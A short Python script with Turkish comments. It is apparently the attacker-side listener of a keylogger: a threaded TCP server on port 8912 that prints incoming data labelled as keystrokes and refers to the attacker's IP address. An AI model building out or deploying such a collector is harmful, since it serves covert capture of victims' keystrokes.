import threading
import socket
import sys



HOST = socket.gethostbyname(socket.gethostname())  # Socketen alınan IP adresi
PORT = 8912  #Port numarası
print('İp Adresi:',HOST) # Saldırganın Ip adresini konsol ekranına yazdırma
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)#Burada IP4 internet protokülü ile iletişim adresini seçtik




def yeni_thread(f, args):

    threading.Thread(target=f, args=args).start()
def main():
    try:
        s.bind((HOST, PORT))#Kendi IP adresimizi ve port numaramızı bulan fonksiyon
    except socket.error as msg:
        print('Baglantı hatası  : ' + str(msg[0]) + ' Mesaj ' + msg[1])
        sys.exit()
    s.listen(0) #Portu dinleme fonksiyonu 0 diyerek sınır belirtmedik.

    print("Port dinlenmeye alındı " + str(PORT))


    while True: # sonsuz döngüye aldık

        sock, addr = s.accept()#Portaki bağlantıyı kabul etme fonksiyonu.
        print('Baglantı adresi ' + addr[0] + ':' + str(addr[1]))#Bağlantı adresi' yazdık

        yeni_thread(baglantı, (sock, addr[0]))

    s.close()




def baglantı(socket, ip):





    while True: #Burada da kapanmamsı için sonsuz döngüye aldık

        
        data = socket.recv(1024).decode('utf-8')

        print("Basıldı: %s" % (data))


        if not data:
            break

    socket.close()




main()
